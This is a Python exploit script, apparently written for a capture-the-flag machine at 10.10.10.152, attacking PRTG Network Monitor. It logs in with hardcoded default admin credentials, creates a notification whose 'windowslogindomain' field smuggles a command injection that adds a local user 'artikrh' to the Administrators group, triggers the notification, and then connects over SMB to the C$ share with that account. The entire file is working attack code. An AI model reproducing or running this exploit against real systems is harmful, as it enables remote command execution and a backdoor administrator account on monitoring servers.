#!/usr/bin/python
__author__ = 'artikrh'
import requests
import os

probable_ids = ['2018','2019','2020']
# This script won't work if there are more than 3 custom notifications already created
# In that case, expand probable_ids to 2021 and further

def main():
	cookie = login()
	addNotification(cookie)
	for id in probable_ids:
		notify(id,cookie)

	os.system("smbclient -U 'artikrh%Pwn333D!' '//10.10.10.152/C$'")

def notify(id,cookie):
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
	    'Accept': '*/*',
	    'Referer': 'http://10.10.10.152/myaccount.htm?tabid=2',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'X-Requested-With': 'XMLHttpRequest',
	}

	data = 'id={}'.format(id)

	requests.post('http://10.10.10.152/api/notificationtest.htm', headers=headers, cookies=cookie, data=data, verify=False)


def addNotification(cookie):
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
	    'Accept': '*/*',
	    'Referer': 'http://10.10.10.152/editnotification.htm?id=new&tabid=1',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'X-Requested-With': 'XMLHttpRequest',
	}

	data = 'name_=Test&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&windowslogindomain_10=test.txt%3Bnet+user+artikrh+Pwn333D!+%2Fadd%3B+net+localgroup+administrators+artikrh+%2Fadd&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2'

	requests.post('http://10.10.10.152/editsettings', headers=headers, cookies=cookie, data=data, verify=False)


def login():
	headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
    'Content-Type': 'application/x-www-form-urlencoded',
	}

	data = 'loginurl=&username=prtgadmin&password=PrTg%40dmin2019'
	with requests.Session() as s:
		s.post('http://10.10.10.152/public/checklogin.htm', headers=headers, data=data, verify=False)
		OCTOPUS1813713946 = {'OCTOPUS1813713946': requests.utils.dict_from_cookiejar(s.cookies)['OCTOPUS1813713946']}
		return OCTOPUS1813713946

if __name__ == '__main__':
	main()
